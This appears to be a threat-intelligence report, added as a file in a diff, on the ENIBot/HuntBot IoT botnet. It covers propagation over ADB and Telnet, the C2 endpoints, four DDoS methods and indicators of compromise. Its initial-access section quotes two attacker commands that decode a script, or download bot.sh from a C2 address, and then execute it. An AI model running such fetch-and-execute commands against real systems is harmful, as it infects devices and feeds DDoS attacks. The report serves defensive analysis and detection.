@@ -1,0 +1,109 @@
+2026-08-14 (FRIDAY): ENIBot/HuntBot campaign
+
+
+AUTHORS:
+
+Zhanhao Chen Adrian Li Ruian Duan Moe Ghasemisharif Shuai Li Daiping Liu
+
+DETAILS:
+
+ENIBot: Technical Analysis
+- ENIbot (aka HuntBot) is an actively spreading IoT botnet that self-propagates across the internet and launches Layer 7 DDoS attacks on command from its command-and-control (C2) infrastructure. 
+- Our honeypots have captured millions of exploitation attempts from ENIBot, along with 3,505 distinct related malware samples delivered by this campaign since March 2026. 
+- To date we have identified 7,504 unique bot IPs distributed globally, based on campaign artifacts observed in our honeypots. The campaign name is taken from the attacker's own scripts dropped onto our honeypots.
+- The operation combines automated exploitation, worm-like lateral movement, and a command-driven attack dispatcher. 
+- The campaign has expanded since May 2026, with the origin of scanning and exploitation traffic shifting continuously across the botnet's geographically distributed hosts.
+
+Initial Access
+Access is established through obfuscated shell commands. Following initial access, the attacker drops malicious Python - scripts.
+
+- echo $base64_encoded_scripts |busybox base64 -d>/tmp/sshd;busybox sh /tmp/sshd 216[.]167.26[.]154 1337 enibot2024
+- busybox wget -q http://216.167.26.154:1337/bot.sh -O /tmp/sshd&&busybox sh /tmp/sshd 216[.]167.26[.]154 1337 enibot2024
+
+Self propagation
+- Each infected host functions as an autonomous worm node, expanding the botnet's size and, correspondingly, its aggregate attack capacity. 
+- After a 45-second startup delay, the bot begins repeating rounds of scanning and infection.
+
+IP generation
+- Each round, the bot generates 600 random IPs using a weighted distribution that prioritizes high-value targets: 
+   - 60% chance: cloud/hosting provider ranges 
+   - 25% chance: private ranges (192.168.0[.]0/16, 10.0.0[.]0/8, 172.16.0[.]0/12)
+   - 15% chance: fully random public IPs
+	
+Port scanning
+- For each generated IP, the bot probes three ports, each mapped to a specific infection path: 
+   - 5555 (ADB): Often left open on Android IoT devices with root access and no authentication required
+   - 23 (Telnet): Standard Telnet port
+   - 2323 (Telnet): Alternate Telnet port used by some IoT devices
+
+- Telnet infection: 
+- On open Telnet ports, the bot brute-forces credentials using the Mirai credential list supplemented with vendor default credentials. 
+- When it detects a shell prompt (recognizing #, $, busybox, etc.), it downloads a copy of itself from the C2's server on port 1337 or 1338, saves it as /tmp/sshd, and executes it. 
+- The newly infected device becomes another bot in the botnet.
+- ADB infection: On open ADB ports, the bot runs adb connect, verifies root access, then pushes a copy of itself to /data/local/tmp/sshd and executes it, likewise converting the device into a new bot.
+- At the end of each round the bot reports its cumulative infection count to the C2. 
+- Because propagation compounds across rounds, each newly infected device incrementally increases the capacity available for subsequent DDoS attacks.
+
+C2 and DDoS
+- Each bot maintains a persistent TCP connection to a C2 server on port 1337 or 1338, authenticating with a key and sending periodic heartbeats along with attack statistics. 
+- The C2 exposes three primary endpoints:
+   - /api/register: bot registration with system information
+   - /api/heartbeat: periodic check-in
+   - /api/poll:  retrieval of commands from the C2
+- When the C2 issues an ATTACK command with target, port, method, and duration, the dispatcher stops any running attack and spawns threads to execute one of four Layer 7 DDoS methods: HTTP GET flood, HTTP POST flood, Slowloris, or RUDY. 
+- The C2 can also issue STOP to halt attacks or RELOAD to push bot updates.
+   - HTTP GET flood: Pipelined requests with realistic browser User-Agents and randomized URL paths to evade firewall filtering
+   - HTTP POST flood: Same idea but sends POST requests with random or C2-specified body data. 
+   - Slowloris: Opens 200+ partial connections to exhaust server thread pool
+   - RUDY: Sends POST with massive content-length but delivers body one byte every 8-12 seconds, keeping connections open indefinitely.
+
+- Trend and geo distribution: 
+- The campaign expanded significantly after May 2026. 
+- The following observations are drawn from our honeypots.
+   - 56.5% scanning traffic is from potentially compromised cloud IP (the targeted propagation IP ranges)
+   - Attackers keep changing the scanning and exploiting sources among the botnet. 
+     - The scanning traffic was mainly from Europe. Among Europe, scanning traffic from AS51396(DE) peaked in May-June, followed by a sharp rise from AS197170(BG) beginning in June 2026.
+     - South and North America emerged as significant new regions in June. 
+
+Vulnerability:
+- Approximately 32% of the scanning IP have vulnerabilities from old OpenSSH versions including CVE-2023-28531(severity:9.8), CVE-2024-6387(severity:8.1) and CVE-2024-41996 (severity:7.5). 
+- These vulnerabilities might originate from the scanner itself or the IoT services that ENIBot targets. 
+
+IOCs:
+Malicious Hashes (Examples):
+13336d8e6fcda501cf62955c223ba4745cb46adf58f466ce6fa52f3b9d1dbdd5
+58241aaf2b2b87cc6182a1733b8a9de09bd4aa69e4da4edb5513c3d67342bfd5
+608fdb60d879201961f436f1a248ed986e439a046a5c1eea9206e91724422490
+4f5cd984efdbfef840ee33a029e1b757402348274ab60c4bcf91b4472b829074
+2e10d9e18123e3b29362f230a0b6bd84bdd128b4cb5556805dca73f9a303a945
+d2470d22ec573e029b8b87209dade2c0a3720982903ee49dcf431ab010141bc7
+5605190d87a9b363fc5e2e4dd44d0d00f247a16762204d7a8020ad832d2b566e
+07603bb8358cdd76b89b0ceeec0b5bacd462b4bfb5dcb9643365eedb96f00f57
+d07505297fa575149cf9f2ec1c5e812a1b70b92e18374b8782ffcda4d987ca71
+b0f843c70c121199ee9cba7d00757a3ca10256555d5272587405611fd3de7b0d
+
+C2 IP:
+- July
+216[.]167.26[.]154
+192[.]204.41[.]160
+- June
+176[.]65.139[.]99
+176[.]65.139[.]7
+- May
+176[.]65.139[.]11
+176[.]65.139[.]69
+176[.]65.139[.]59
+
+Scanning IP (Examples):
+52[.]190.182[.]226
+20[.]169.94[.]182
+172[.]183.94[.]160
+135[.]232.224[.]163
+135[.]119.132[.]147
+40[.]76.181[.]212
+135[.]232.200[.]66
+20[.]171.55[.]49
+52[.]165.58[.]34
+64[.]236.135[.]131
+
+
